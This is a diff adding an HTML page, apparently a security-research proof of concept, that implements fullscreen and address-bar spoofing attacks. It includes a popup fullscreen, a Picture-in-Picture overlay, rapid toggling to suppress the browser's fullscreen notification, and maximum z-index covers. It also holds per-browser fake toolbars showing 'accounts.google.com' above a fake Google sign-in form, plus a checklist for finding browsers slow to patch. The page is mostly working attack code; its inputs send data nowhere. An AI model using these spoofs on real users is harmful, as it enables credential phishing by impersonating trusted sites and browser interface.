@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Fullscreen Spoofing — Advanced Variants</title>
+<style>
+  body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3; padding: 30px; }
+  h1 { color: #f0883e; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 16px 0; }
+  h3 { color: #58a6ff; margin-bottom: 10px; }
+  pre { background: #0d1117; padding: 14px; border-radius: 6px; font-size: 12px; color: #c9d1d9; overflow-x: auto; white-space: pre-wrap; }
+  .btn { padding: 10px 20px; background: #238636; color: white; border: none; border-radius: 6px;
+         cursor: pointer; font-size: 14px; font-weight: bold; margin-right: 8px; margin-top: 8px; }
+  .log { background: #0d1117; border-radius: 6px; padding: 14px; margin-top: 14px; font-family: monospace; font-size: 12px; min-height: 80px; }
+  /* Fake browser UI for each variant */
+  .fake-ui { display:none; position:fixed; top:0; left:0; width:100%; z-index:999999; }
+</style>
+</head>
+<body>
+<h1>Advanced Fullscreen Spoofing Variants</h1>
+<p style="color:#8b949e; margin-bottom: 24px;">Test these variants across Edge, Opera, Brave, Arc, Firefox, Safari to find which lag in patching</p>
+
+<!-- Variant A: Popup window approach -->
+<div class="card">
+  <h3>Variant A: Popup + Fullscreen (CVE-2020-6810 pattern)</h3>
+  <p style="color:#8b949e; font-size:13px; margin-bottom:12px;">Open popup window, enter fullscreen in popup. Popup covers notification in main window. Works when popup is fullscreened separately.</p>
+  <pre>// Open popup, enter fullscreen inside it
+var popup = window.open('about:blank', '_blank', 'width=800,height=600');
+popup.document.write('&lt;script&gt;document.documentElement.requestFullscreen();&lt;/script&gt;');
+// Now draw fake UI in popup</pre>
+  <button class="btn" onclick="variantA()">▶ Test Variant A</button>
+  <div class="log" id="log-a">Ready...</div>
+</div>
+
+<!-- Variant B: Picture-in-Picture -->
+<div class="card">
+  <h3>Variant B: Picture-in-Picture Overlay</h3>
+  <p style="color:#8b949e; font-size:13px; margin-bottom:12px;">Use PiP API to create a floating window that overlays the address bar area. No fullscreen needed — subtler attack.</p>
+  <pre>// Document PiP API (Chrome 116+, Edge, Opera)
+const pipWindow = await documentPictureInPicture.requestWindow({
+  width: window.screen.width,
+  height: 60  // Just enough to cover address bar area at top
+});
+pipWindow.document.write('&lt;div style="background:white;padding:8px"&gt;🔒 accounts.google.com&lt;/div&gt;');</pre>
+  <button class="btn" onclick="variantB()">▶ Test PiP Overlay</button>
+  <div class="log" id="log-b">Ready...</div>
+</div>
+
+<!-- Variant C: Rapid toggle -->
+<div class="card">
+  <h3>Variant C: Rapid Fullscreen Toggle (notification suppression)</h3>
+  <p style="color:#8b949e; font-size:13px; margin-bottom:12px;">Toggle fullscreen on/off rapidly. After N cycles, browser may stop showing notification (timing attack on rate limiting of notifications).</p>
+  <pre>// Toggle 5 times quickly, then on final entry show fake UI
+for (let i = 0; i &lt; 5; i++) {
+  await document.documentElement.requestFullscreen();
+  await document.exitFullscreen();
+}
+await document.documentElement.requestFullscreen(); // notification suppressed?
+showFakeBrowserUI();</pre>
+  <button class="btn" onclick="variantC()">▶ Test Rapid Toggle</button>
+  <div class="log" id="log-c">Ready...</div>
+</div>
+
+<!-- Variant D: CSS cover attack -->
+<div class="card">
+  <h3>Variant D: CSS Z-index Notification Cover</h3>
+  <p style="color:#8b949e; font-size:13px; margin-bottom:12px;">After fullscreen, use high z-index elements to immediately cover the notification bar before user can see/interact with it.</p>
+  <pre>// Create pre-positioned covering element, show on fullscreen
+const cover = document.createElement('div');
+cover.style.cssText = `
+  position: fixed; top: 0; left: 0; right: 0; height: 80px;
+  background: #f8f9fa; z-index: 2147483647; /* Max z-index */
+  display: flex; align-items: center; padding: 0 12px;
+`;
+cover.innerHTML = '🔒 accounts.google.com — fake toolbar at z-index max';
+document.body.appendChild(cover);</pre>
+  <button class="btn" onclick="variantD()">▶ Test CSS Cover</button>
+  <div class="log" id="log-d">Ready...</div>
+</div>
+
+<!-- Variant E: Browser-specific UI templates -->
+<div class="card">
+  <h3>Variant E: Browser-Specific Fake UI Templates</h3>
+  <p style="color:#8b949e; font-size:13px; margin-bottom:12px;">Tailored fake address bar for each browser's visual style — more convincing, harder to spot.</p>
+  <button class="btn" onclick="runWithUI('chrome')">Chrome UI</button>
+  <button class="btn" onclick="runWithUI('firefox')">Firefox UI</button>
+  <button class="btn" onclick="runWithUI('safari')">Safari UI</button>
+  <button class="btn" onclick="runWithUI('edge')">Edge UI</button>
+  <div class="log" id="log-e">Ready...</div>
+</div>
+
+<!-- Testing checklist -->
+<div class="card">
+  <h3>📋 Testing Checklist for Each Browser</h3>
+  <pre>For each browser (Firefox, Edge, Opera, Brave, Arc):
+
+[ ] Basic: Does requestFullscreen() notification appear?
+[ ] Timing: How long is notification visible? (measure in ms)
+[ ] Cover: Can z-index elements cover the notification?
+[ ] Rapid toggle: Does notification appear on 5th entry?
+[ ] User gesture: What gestures trigger fullscreen?
+[ ] ESC behavior: Can ESC be captured/suppressed?
+[ ] Mobile: Is Android/iOS behavior different?
+[ ] Permissions: Does browser remember fullscreen permission?
+
+Scoring:
+  Notification visible &gt; 3s + can't be covered = PATCHED
+  Notification &lt; 1s OR can be covered = VULNERABLE
+  No notification = CRITICAL</pre>
+</div>
+
+<!-- Fake browser UI templates -->
+<div id="full-overlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;flex-direction:column;">
+  <div id="browser-toolbar" style="height:50px;display:flex;align-items:center;padding:0 12px;gap:10px;"></div>
+  <div style="flex:1;background:#f8f9fa;padding:40px;">
+    <div style="max-width:450px;margin:0 auto;background:white;border:1px solid #dadce0;border-radius:8px;padding:40px;box-shadow:0 2px 8px rgba(0,0,0,0.08)">
+      <div style="text-align:center;margin-bottom:20px;font-size:28px;font-weight:300;color:#202124">Google</div>
+      <h2 style="text-align:center;font-weight:400;font-size:22px;color:#202124;margin:0 0 8px">Sign in</h2>
+      <p style="text-align:center;color:#5f6368;font-size:15px;margin:0 0 24px">to continue to Google Account</p>
+      <input placeholder="Email or phone" style="width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;font-size:16px;box-sizing:border-box">
+      <input type="password" placeholder="Enter your password" style="width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;margin-bottom:20px;font-size:16px;box-sizing:border-box">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none">Create account</a>
+        <button style="padding:10px 24px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;cursor:pointer">Next</button>
+      </div>
+      <p style="text-align:center;margin-top:16px;font-size:11px;color:#f44336">⚠ RESEARCH PoC — This page is spoofed, not real Google</p>
+    </div>
+  </div>
+  <button onclick="closeOverlay()" style="position:fixed;bottom:20px;right:20px;background:#333;color:white;border:none;padding:8px 16px;border-radius:20px;cursor:pointer">Exit Demo</button>
+</div>
+
+<script>
+const SPOOF_URL = 'accounts.google.com';
+const BROWSERS = {
+  chrome: {
+    bg: '#f1f3f4', borderBottom: '1px solid #dadce0',
+    urlBg: 'white', urlBorder: '1px solid #dadce0', urlRadius: '20px',
+    lockColor: '#188038', urlColor: '#202124',
+  },
+  firefox: {
+    bg: '#2b2a33', borderBottom: '1px solid #52525e',
+    urlBg: '#1c1b22', urlBorder: '1px solid #8f8f9d', urlRadius: '6px',
+    lockColor: '#0df', urlColor: '#ffffff',
+  },
+  safari: {
+    bg: '#ebebeb', borderBottom: '1px solid #c8c8c8',
+    urlBg: 'white', urlBorder: '1px solid #b9b9b9', urlRadius: '8px',
+    lockColor: '#34c759', urlColor: '#1c1c1e',
+  },
+  edge: {
+    bg: '#f3f3f3', borderBottom: '1px solid #e0e0e0',
+    urlBg: 'white', urlBorder: '1px solid #d3d3d3', urlRadius: '4px',
+    lockColor: '#107c10', urlColor: '#1a1a1a',
+  },
+};
+
+function log(id, msg, ok) {
+  const el = document.getElementById('log-' + id);
+  const color = ok === true ? '#3fb950' : ok === false ? '#f85149' : '#8b949e';
+  el.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span>\n`;
+}
+
+async function runFullscreen() {
+  await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+}
+
+async function variantA() {
+  log('a', 'Opening popup...');
+  const popup = window.open('', '_blank', 'width=800,height=600,left=0,top=0');
+  if (!popup) { log('a', 'Popup blocked!', false); return; }
+  popup.document.write(`<html><body style="margin:0">
+    <button style="padding:20px;font-size:20px" onclick="document.documentElement.requestFullscreen()">Enter Fullscreen</button>
+    <div id="fake" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
+      <div style="background:#f1f3f4;padding:10px;border-bottom:1px solid #ccc">🔒 ${SPOOF_URL}</div>
+      <div style="padding:40px">Popup fullscreen with spoofed URL</div>
+    </div>
+    <script>
+      document.addEventListener('fullscreenchange', () => {
+        if(document.fullscreenElement) document.getElementById('fake').style.display='block';
+      });
+    <\/script>
+    </body></html>`);
+  log('a', 'Popup opened — click the button in popup to test fullscreen', null);
+}
+
+async function variantB() {
+  if (!window.documentPictureInPicture) {
+    log('b', 'documentPictureInPicture API not available in this browser', false);
+    log('b', 'Supported: Chrome 116+, Edge 116+. NOT Firefox, Safari, Opera', null);
+    return;
+  }
+  try {
+    const pip = await window.documentPictureInPicture.requestWindow({ width: 400, height: 50 });
+    pip.document.body.style.cssText = 'margin:0;background:#f1f3f4;display:flex;align-items:center;padding:0 12px;gap:8px;font-family:system-ui';
+    pip.document.body.innerHTML = '<span style="color:#188038;font-size:14px">🔒</span><span style="font-size:13px;color:#202124">' + SPOOF_URL + '</span>';
+    log('b', 'PiP window opened! Position it over your browser address bar', true);
+    log('b', 'This creates a floating overlay showing spoofed URL', null);
+  } catch(e) {
+    log('b', 'PiP failed: ' + e.message, false);
+  }
+}
+
+async function variantC() {
+  log('c', 'Starting rapid toggle (5 cycles)...');
+  for (let i = 0; i < 5; i++) {
+    try {
+      await document.documentElement.requestFullscreen();
+      await new Promise(r => setTimeout(r, 80));
+      await document.exitFullscreen();
+      await new Promise(r => setTimeout(r, 40));
+      log('c', `Toggle ${i+1}/5 done`);
+    } catch(e) { log('c', `Toggle error: ${e.message}`, false); return; }
+  }
+  try {
+    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+    setTimeout(() => {
+      document.getElementById('full-overlay').style.display = 'flex';
+      setBrowserUI('chrome');
+      log('c', '6th fullscreen — is notification visible? If not = VULNERABLE', true);
+    }, 100);
+  } catch(e) { log('c', 'Final fullscreen failed: ' + e.message, false); }
+}
+
+async function variantD() {
+  try {
+    await document.documentElement.requestFullscreen();
+    // Create max z-index covering element immediately
+    const cover = document.createElement('div');
+    cover.style.cssText = 'position:fixed;top:0;left:0;right:0;height:80px;background:#f1f3f4;z-index:2147483647;display:flex;align-items:center;padding:0 12px;gap:10px;border-bottom:1px solid #dadce0;';
+    cover.innerHTML = '<span style="color:#188038">🔒</span><span style="font-size:14px;color:#202124">' + SPOOF_URL + '</span>';
+    document.body.appendChild(cover);
+    log('d', 'Max z-index cover element placed. Can you see the fullscreen notification below it?', null);
+    log('d', 'If notification is hidden = VULNERABLE (cover works)', true);
+    setTimeout(() => cover.remove(), 8000);
+  } catch(e) { log('d', 'Error: ' + e.message, false); }
+}
+
+function setBrowserUI(type) {
+  const b = BROWSERS[type] || BROWSERS.chrome;
+  const toolbar = document.getElementById('browser-toolbar');
+  toolbar.style.cssText = `background:${b.bg};border-bottom:${b.borderBottom};height:50px;display:flex;align-items:center;padding:0 12px;gap:10px;`;
+  toolbar.innerHTML = `
+    <span style="font-size:18px;color:#888">← → ↻</span>
+    <div style="flex:1;background:${b.urlBg};border:${b.urlBorder};border-radius:${b.urlRadius};padding:6px 14px;display:flex;align-items:center;gap:8px;">
+      <span style="color:${b.lockColor}">🔒</span>
+      <span style="color:${b.urlColor};font-size:14px">${SPOOF_URL}</span>
+    </div>
+    <span style="font-size:18px;color:#888">⋮</span>`;
+}
+
+async function runWithUI(type) {
+  try {
+    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+    setTimeout(() => {
+      document.getElementById('full-overlay').style.display = 'flex';
+      setBrowserUI(type);
+      log('e', `Showing ${type} UI theme on fullscreen`, true);
+    }, 200);
+  } catch(e) { log('e', 'Error: ' + e.message, false); }
+}
+
+function closeOverlay() {
+  document.getElementById('full-overlay').style.display = 'none';
+  if (document.fullscreenElement) document.exitFullscreen();
+}
+
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement) {
+    document.getElementById('full-overlay').style.display = 'none';
+  }
+});
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') closeOverlay();
+});
+</script>
+</body>
+</html>
